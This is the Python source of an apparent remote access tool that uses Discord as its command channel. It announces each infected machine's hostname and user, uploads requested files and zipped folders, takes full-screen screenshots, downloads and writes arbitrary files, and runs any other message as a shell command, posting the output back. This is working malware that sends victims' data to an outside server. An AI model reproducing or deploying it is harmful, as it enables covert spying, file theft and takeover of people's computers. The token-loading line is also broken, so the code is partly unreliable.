from fileinput import filename
from types import NoneType
import traceback
import requests
import discord, socket, os, subprocess, shutil, webbrowser, playsound, aiohttp
from PIL import ImageGrab
from io import BytesIO, TextIOWrapper
import asyncio
import functools
import time
import typing
import dotenv

dotenv_path = os.path.normpath(os.environ["appdata"]+"/dish/.env") if os.path.exists(os.environ["appdata"]+"/dish/.env") else ".env"

try:
    dotenv.load_dotenv(dotenv_path)
except:
    pass

guild_id: int = 1005811804510892064
category_id: int = 1009728599819042867
try:
    token: os.environ["TOKEN"]
except:
    exit("No token specified")
class Dashboard(discord.ui.View):
    def __init__(self, *, timeout: typing.Optional[float] = 0):
        super().__init__(timeout=timeout)

editor_filename = ""
file_content = ""

async def play(client: discord.Client, message: discord.Message, args: str):
    playsound.playsound(message.attachments[0].url)



def exec_command(command):
    exec = subprocess.run(command, capture_output=True, text=True, shell=True)
    return (exec.stdout, exec.stderr)


async def dump(client: discord.Client, message: discord.Message, args: str):
    if not os.path.exists(args):
        return await message.channel.send("Not existing-file")

    if os.path.isdir(args):
        executor = functools.partial(shutil.make_archive, args, "zip", args)
        await client.loop.run_in_executor(None, executor)
        return await message.channel.send(file=discord.File(args + ".zip"))

    with open(args, "rb") as fp:
        await message.channel.send(file=discord.File(fp))


async def screenshot(client: discord.Client, message: discord.Message, args: str):
    img = ImageGrab.grab(all_screens=True)
    byteio = BytesIO()
    img.save(byteio, format="PNG")
    byteio.seek(0)
    await message.channel.send(file=discord.File(byteio, "screenshot.png"))


async def cd(client: discord.Client, message: discord.Message, args: str):
    print(args)
    os.chdir(args)
    await message.channel.send("Changed directory to " + args)


async def upload(client: discord.Client, message: discord.Message, args: str):
    file = message.attachments[0].url
    async with aiohttp.ClientSession() as session:
        async with session.get(file) as r:
            data = await r.read()
            with open(args, "wb") as fp:
                fp.write(data)
                await message.channel.send("Uploaded file to " + args)
                fp.close()
            r.close()
        await session.close()


async def download(client: discord.Client, message: discord.Message, args: str):
    url = args.split(" ")[0]
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as r:
            data = await r.read()
            with open(" ".join(args.split(" ")[1:]), "wb") as fp:
                fp.write(data)
                await message.channel.send(
                    "Downloaded file to " + " ".join(args.split(" ")[1:])
                )
                fp.close()
            r.close()
        await session.close()

async def edit(client: discord.Client, message: discord.Message, args: str):
    await message.channel.send("Editing file " + args)
    try:
        await message.channel.send(file=discord.File(args))
    except:
        await message.channel.send("File does not exist :C")
    
    await message.channel.send("Send the new file content")
    try:
        file_content = await client.wait_for("message", check=lambda m: m.author == message.author, timeout=120)
        f = open(args, "w")
        f.write(file_content.content)
        f.close()
        await message.channel.send("Edited file")
    except asyncio.TimeoutError:
        await message.channel.send("Too much time has passed :C")


async def pwd(client: discord.Client, message: discord.Message, args: str):
    await message.channel.send("Current directory is " + os.getcwd())


async def browser(client, message, args):
    webbrowser.open(args)


class RemoteClient(discord.Client):
    def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.guild_id: int = guild_id
        self.category_id: int = category_id
        self.hostname: str = socket.gethostname()
        self.channel = None
        self.modules = {
            "dump": dump,
            "cd": cd,
            "pwd": pwd,
            "browser": browser,
            "play": play,
            "screenshot": screenshot,
            "upload": upload,
            "download": download,
            "edit": edit
        }

    async def on_ready(self):
        print(f"Logged in as {self.user}")
        guild: discord.Guild = self.get_guild(self.guild_id)
        category: discord.CategoryChannel = guild.get_channel(self.category_id)
        channel_name: str = (
            self.hostname.lower().replace(" ", "-")
            + "-"
            + os.getlogin().lower().replace(" ", "-")
        )
        channel = guild.get_channel(1010100704863592498)
        await channel.send(f"Bot launched on {self.hostname} as {os.getlogin()}")
        for a in category.text_channels:
            if a.name == channel_name:
                self.channel = a
        if self.channel == None:
            self.channel = await guild.create_text_channel(
                channel_name, category=category
            )
        print(self.channel.name)
        await self.channel.send(
            f"Bot launched succesfully on PC {self.hostname} as {os.getlogin()}"
        )

    async def on_message(self, message: discord.Message):
        if message.channel == self.channel or message.channel.id == 1016257267416436786:
            if message.author.bot:
                return
            parsed = message.content.split(" ")
            try:
                print(self.modules[parsed[0]])
                if len(parsed) > 1:
                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]))
                else:
                    await self.modules[parsed[0]](self, message, "")
            except KeyError:
                await message.channel.send(
                    f"Command {parsed[0]} not found in ovverrides, executing from command line instead"
                )
                executor = functools.partial(exec_command, parsed)
                res = await self.loop.run_in_executor(None, executor)

                try:
                    if len(res[0]) > 0:

                        await message.channel.send(f"Stdout: ```bat\n{res[0]}\n```")
                    if len(res[1]) > 0:
                        await message.channel.send(f"Stderr: ```bat\n{res[1]}\n```")
                except:
                    f = BytesIO(f"Stdout: {res[0]}\n\nStderr: {res[1]}```".encode())
                    await message.channel.send(file=discord.File(f, "output.txt"))

            except:
                traceback.print_exc()
                exc = traceback.format_exc()
                await message.channel.send(f"Python Errors: ```py\n{exc}\n```")


if __name__ == "__main__":
    connected = False
    while not connected:
        try:
            r = requests.get("https://example.com")
            if r.status_code == 200:
                connected = True

        except:
            pass
        time.sleep(1)

    client = RemoteClient(guild_id, category_id, intents=discord.Intents.all())
    client.run(token)
